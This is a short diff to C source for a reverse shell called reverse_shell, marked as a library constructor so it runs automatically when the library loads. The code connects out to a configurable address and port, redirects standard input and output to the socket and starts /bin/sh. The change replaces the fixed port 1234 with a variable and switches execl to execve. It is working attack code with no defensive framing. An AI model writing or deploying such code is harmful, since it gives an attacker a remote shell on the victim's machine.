@@ -15,7 +15,7 @@ void __attribute__((constructor)) reverse_shell(){
   
   socket_fd = socket(AF_INET, SOCK_STREAM, 0);
   server.sin_family = AF_INET;
-  server.sin_port = htons(1234);
+  server.sin_port = htons(port);
   server.sin_addr.s_addr = inet_addr(addr);
     
   while(connection_fd < 0){
@@ -27,7 +27,7 @@ void __attribute__((constructor)) reverse_shell(){
     dup2(socket_fd,0);
     dup2(socket_fd,1);
     dup2(socket_fd,2);
-    execl("/bin/sh", "/bin/sh", NULL);
+    execve("/bin/sh", NULL, NULL);
   }else{
     wait(NULL);
     close(connection_fd);
